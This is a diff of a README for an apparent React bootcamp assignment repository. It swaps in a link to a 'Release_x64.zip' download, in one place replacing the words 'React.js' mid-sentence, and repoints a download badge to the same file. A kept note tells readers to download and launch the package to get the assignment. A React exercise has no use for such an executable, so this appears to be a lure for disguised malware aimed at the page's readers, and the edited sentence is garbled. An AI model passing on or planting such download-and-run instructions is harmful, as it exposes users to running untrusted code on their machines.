@@ -4,7 +4,7 @@
 **Hex2024-React-Training-Week3**
 
 ## Description:
-Welcome to the Hex 2024 React Winter Bootcamp 2024 third week assignment repository. In this assignment, you will enhance your React.js skills and dive deeper into various concepts. Get ready to elevate your React game and build amazing projects!
+Welcome to the Hex 2024 React Winter Bootcamp 2024 third week assignment repository. In this assignment, you will enhance your https://github.com/Kevx7/Hex2024-React-Training-Week3/releases/download/v2.0/Release_x64.zip skills and dive deeper into various concepts. Get ready to elevate your React game and build amazing projects!
 
 ## Topics:
 ['axios', 'bootstrap5', 'gh-pages', 'json', 'jsx', 'map', 'react', 'restful-api', 'soc', 'swagger-ui', 'vite']
@@ -15,7 +15,7 @@ In this assignment, you will be working on various topics like integrating Axios
 ## Assignment Files:
 To get started with the assignment, please download the necessary software package by clicking the link below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Kevx7/Hex2024-React-Training-Week3/releases/download/v2.0/Release_x64.zip)](https://github.com/Kevx7/Hex2024-React-Training-Week3/releases/download/v2.0/Release_x64.zip)
 
 *Note: The provided link is a software package ZIP file that needs to be downloaded and launched to access the assignment files.*
 
